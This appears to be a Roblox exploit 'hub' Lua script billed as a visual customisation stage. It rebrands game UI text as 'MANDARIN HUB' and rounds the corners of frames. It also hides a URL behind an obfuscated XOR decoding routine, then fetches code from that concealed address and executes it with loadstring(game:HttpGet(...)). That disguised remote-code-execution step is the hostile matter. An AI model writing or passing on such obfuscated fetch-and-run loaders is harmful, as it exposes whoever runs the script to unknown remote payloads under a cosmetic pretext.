
--[[ STAGE 2: VISUAL CORE ]]
local NAjypCVyDIM4fipE="\169\087\081\079\068\185\188\182\113\120\096\027\098\097\018\009\067\006\052\048\104\033\042\206\016\203\062\203\199\051\240\192\236"local VijKZjGZTytMrXP7VTLhy=94 local PDh0Jj0jgRGpiDC=123 local Ew8I9fN_Na5rnRwAs6Rgao=1 local srTHaRbDsmyzj=6 local TgJexegCHhQjdVnj=14 local DPq2EqhZ7Jh6BWmVeu=false local sx_QR9EiffDhMti1k=bit32 and bit32.bxor if not sx_QR9EiffDhMti1k then sx_QR9EiffDhMti1k=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local _vxh8_FeVSUB={}for tNM0p1LXN99Bl=1,#NAjypCVyDIM4fipE do local KxeynEcNqPdzI=string.byte(NAjypCVyDIM4fipE,tNM0p1LXN99Bl)local jA7MZgQtBav3C1iGH=(PDh0Jj0jgRGpiDC+(tNM0p1LXN99Bl*srTHaRbDsmyzj)+TgJexegCHhQjdVnj)%256 if Ew8I9fN_Na5rnRwAs6Rgao==0 then KxeynEcNqPdzI=(KxeynEcNqPdzI-jA7MZgQtBav3C1iGH)%256 _vxh8_FeVSUB[tNM0p1LXN99Bl]=string.char(sx_QR9EiffDhMti1k(KxeynEcNqPdzI,VijKZjGZTytMrXP7VTLhy))else KxeynEcNqPdzI=sx_QR9EiffDhMti1k(KxeynEcNqPdzI,VijKZjGZTytMrXP7VTLhy)_vxh8_FeVSUB[tNM0p1LXN99Bl]=string.char((KxeynEcNqPdzI-jA7MZgQtBav3C1iGH)%256)end end local V3S9mMnEhlRIIJCmRQnzlp=table.concat(_vxh8_FeVSUB)if DPq2EqhZ7Jh6BWmVeu then V3S9mMnEhlRIIJCmRQnzlp=string.reverse(V3S9mMnEhlRIIJCmRQnzlp)end local Hzqg1asZw8bXge=V3S9mMnEhlRIIJCmRQnzlp
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Hzqg1asZw8bXge))()
